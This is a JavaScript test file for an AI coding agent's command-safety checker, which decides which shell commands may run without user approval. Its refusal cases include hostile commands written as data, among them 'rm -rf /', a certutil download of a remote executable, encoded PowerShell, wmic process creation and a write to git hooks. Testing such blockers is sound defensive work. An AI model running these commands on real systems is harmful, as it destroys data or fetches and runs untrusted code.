/**
 * Which commands may run without asking.
 *
 * The rule set follows Claude Code: it parses the shell AST and refuses
 * anything it cannot prove safe (chunk-41tke5jp.js in claude-src). These
 * tests use the same constructs Claude names in its refusal reasons.
 */
import test from "node:test";
import assert from "node:assert/strict";

import {
  isAutoApprovable,
  autoApprovalBlocker,
  splitCommands,
  commandName,
  pathCheckBlocker,
} from "../src/agent/command-safety.js";

test("routine commands may run unattended", () => {
  for (const cmd of [
    "npm test",
    "ls -la",
    "git status",
    "git log --oneline -5",
    "git diff",
    "node --version",
    "cat package.json",
    "grep -r foo src",
    "python -m pytest",
    "cargo build",
  ]) {
    assert.equal(isAutoApprovable(cmd), true, cmd);
  }
});

test("git commands that change state may not run unattended", () => {
  for (const cmd of [
    "git push",
    "git commit -m x",
    "git reset --hard",
    "git checkout .",
    "git clean -fd",
  ]) {
    assert.equal(isAutoApprovable(cmd), false, cmd);
  }
});

test("constructs that hide what a command does are refused", () => {
  // Every case here is one Claude Code names in its refusal reasons.
  const cases = [
    ["echo $(whoami)", "subshell"],
    ["echo `whoami`", "backtick"],
    ["powershell -EncodedCommand SQBFAFgA", "encoded"],
    ["Invoke-Expression Get-Process", "Invoke-Expression"],
    ["Invoke-Item setup.exe", "Invoke-Item"],
    ["Start-Process notepad", "Start-Process"],
    ["New-Object -ComObject Scripting.FileSystemObject", "New-Object"],
    ["Add-Type -TypeDefinition X", "Add-Type"],
    ["wmic process call create calc", "wmic"],
    ["schtasks /create /tn x", "schtasks"],
    ["certutil -urlcache -split -f http://x/a.exe", "certutil"],
  ];
  for (const [cmd, label] of cases) {
    const why = autoApprovalBlocker(cmd);
    assert.ok(why, cmd + " should be refused");
    assert.match(why, new RegExp(label, "i"), cmd + " -> " + why);
  }
});

test("a chained command is judged by its riskiest part", () => {
  assert.equal(isAutoApprovable("npm test && git push"), false);
  assert.equal(isAutoApprovable("cat a.txt | grep x"), true);
  assert.equal(isAutoApprovable("ls; rm -rf /"), false);
});

test("splitting finds every part of a compound command", () => {
  assert.deepEqual(splitCommands("a && b | c ; d"), ["a", "b", "c", "d"]);
  assert.deepEqual(splitCommands("  "), []);
});

test("the executable name is taken without its path", () => {
  assert.equal(commandName('"C:\\Program Files\\node\\node.exe" --version'), "node.exe");
  assert.equal(commandName("/usr/bin/git status"), "git");
  assert.equal(commandName("npm test"), "npm");
});

test("commands that change the working directory are flagged", () => {
  assert.ok(pathCheckBlocker("cd build && npm test"));
  assert.ok(pathCheckBlocker("Set-Location C:\\other"));
  assert.equal(pathCheckBlocker("npm test"), null);
});

test("touching .git is flagged", () => {
  assert.ok(pathCheckBlocker("echo x > .git/hooks/post-commit"));
  assert.ok(pathCheckBlocker("git config core.hooksPath .git/hooks"));
  assert.equal(pathCheckBlocker("git status"), null);
});
